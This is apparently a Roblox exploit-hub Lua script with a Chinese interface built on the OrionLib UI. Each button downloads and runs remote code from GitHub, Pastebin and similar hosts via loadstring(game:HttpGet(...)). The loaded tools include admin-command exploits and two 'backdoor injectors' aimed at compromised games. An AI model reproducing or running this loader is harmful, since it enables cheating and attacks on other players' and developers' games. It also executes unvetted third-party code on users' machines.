local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/Hs-klxy/my-Roblox-UI/refs/heads/main/OrionLib.lua'))()

-- 启动通知
OrionLib:MakeNotification({
    Name = "启动提示",
    Content = "脚本启动中，5秒后加载",
    Image = "rbxassetid://102420960378431",
    Time = 5
})

-- 创建窗口
local Window = OrionLib:MakeWindow({
    Name = "CNIHs_klxy123的第一个脚本 (缝合 第一版)", 
    HidePremium = false, 
    SaveConfig = true, 
    ConfigFolder = "测试中🛠"
})

-- 创建tab
local Tab1 = Window:MakeTab({
    Name = "通用缝合（好玩的脚本）",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local Tab2 = Window:MakeTab({
    Name = "通用缝合（实用）",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local Tab3 = Window:MakeTab({
    Name = "嘿壳",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local Tab4 = Window:MakeTab({
    Name = "Genesis FE",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

-- Tab1按钮
Tab1:AddButton({
    Name = "动作飞行（R6）",
    Callback = function()
        OrionLib:MakeNotification({
            Name = "加载中",
            Content = "正在加载动作飞行脚本...",
            Image = "rbxassetid://4483345998",
            Time = 3
        })
        loadstring(game:HttpGet("https://pastefy.app/59mJGQGe/raw"))()
    end    
})

Tab1:AddButton({
    Name = "心灵感应",
    Callback = function()
        OrionLib:MakeNotification({
            Name = "加载中",
            Content = "正在加载心灵感应脚本...",
            Image = "rbxassetid://4483345998",
            Time = 3
        })
        loadstring(game:HttpGet("https://pastebin.com/raw/sAi0A9Mc"))()
    end    
})

Tab1:AddButton({
    Name = "聊天框画画",
    Callback = function()
        OrionLib:MakeNotification({
            Name = "加载中",
            Content = "正在加载聊天框画画脚本...",
            Image = "rbxassetid://4483345998",
            Time = 3
        })
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ocfi/_/refs/heads/main/a"))()
    end    
})

-- Tab2按钮
Tab2:AddButton({
    Name = "Systembroken",
    Callback = function()
        OrionLib:MakeNotification({
            Name = "加载中",
            Content = "正在加载Systembroken脚本...",
            Image = "rbxassetid://4483345998",
            Time = 3
        })
        loadstring(game:HttpGet('https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script'))()
    end    
})

Tab2:AddButton({
    Name = "逆天终端（对手机极其友好）",
    Callback = function()
        OrionLib:MakeNotification({
            Name = "加载中",
            Content = "正在加载逆天终端脚本...",
            Image = "rbxassetid://4483345998",
            Time = 3
        })
        loadstring(game:HttpGet('https://raw.githubusercontent.com/hm5650/TopPrompt/refs/heads/main/TopPrompt.lua',true))()
    end    
})

Tab2:AddButton({
    Name = "IY FE",
    Callback = function()
        OrionLib:MakeNotification({
            Name = "加载中",
            Content = "正在加载IY FE脚本...",
            Image = "rbxassetid://4483345998",
            Time = 3
        })
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    end    
})


Tab2:AddButton({
    Name = "CMD-X（手机不可用）",
    Callback = function()
        OrionLib:MakeNotification({
            Name = "加载中",
            Content = "正在加载CMD-X脚本...",
            Image = "rbxassetid://4483345998",
            Time = 3
        })
        loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
    end    
})

-- Tab3按钮
Tab3:AddButton({
    Name = "jalon的后门注入器",
    Callback = function()
        OrionLib:MakeNotification({
            Name = "警告",
            Content = "正在加载后门注入器，请谨慎使用！",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/scripts/backdoor-executor.lua"))()
    end    
})

Tab3:AddButton({
    Name = "LALOL 后门注入器",
    Callback = function()
        OrionLib:MakeNotification({
            Name = "警告",
            Content = "正在加载后门注入器，请谨慎使用！",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
        loadstring(game:HttpGet("https://raw.githubusercontent.com/dirsks/Backdoor-Game-V2/refs/heads/main/LALOL-Hub-Backdoor/Loader.luau"))()
    end    
})

Tab3:AddButton({
    Name = "ac6嘿壳😱😱😱",
    Callback = function()
        OrionLib:MakeNotification({
            Name = "加载中",
            Content = "正在加载ac6嘿壳脚本...",
            Image = "rbxassetid://4483345998",
            Time = 3
        })
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Roblox-HttpSpy/my-Garbage/refs/heads/main/FeMusicExploit.lua'))()
    end    
})

Tab3:AddButton({
    Name = "QuirkyCMD",
    Callback = function()
        OrionLib:MakeNotification({
            Name = "加载中",
            Content = "正在加载QuirkyCMD脚本...",
            Image = "rbxassetid://4483345998",
            Time = 3
        })
        loadstring(game:HttpGet('https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw'))()
    end    
})

-- Tab4: Genesis FE (目前为空，可以添加内容)


-- 初始化OrionLib
OrionLib:Init()
